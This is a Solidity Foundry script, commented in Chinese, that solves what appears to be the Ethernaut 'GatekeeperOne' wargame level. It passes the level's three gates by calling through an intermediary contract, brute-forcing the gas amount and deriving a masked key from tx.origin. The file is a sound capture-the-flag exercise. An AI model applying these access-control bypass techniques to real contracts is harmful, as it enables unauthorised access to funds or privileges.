// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// target 通過三個檢查, 滿足題目的三個 function
// 1.msg.sender != tx.origin
// 2.當前的 gas 數量能被 8191 整除
// 3.複雜......會用到 type casting, 要能在 uint, bytes, address 之間轉換

contract attackCon {
    GatekeeperOne challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = GatekeeperOne(_challengeInstance);
    }

    function attack() external {
        //Gate3
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        
        // Gate2
        for (uint256 i = 0; i < 8191; i++) {
            (bool result, ) = address(challengeInstance).call{
                gas: i + 8191 * 3
            }(abi.encodeWithSignature("enter(bytes8)", key));
            if (result) {
                break;
            }
        }
    }
}

contract Lev13Sol is Script {
    GatekeeperOne public Lev13Instance =
        GatekeeperOne(0xe4A83d861C21A9f7749086C9F5D1F1F39E4ed00C);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        attackCon myattackCon = new attackCon(address(Lev13Instance));
        myattackCon.attack();

        vm.stopBroadcast();
    }
}
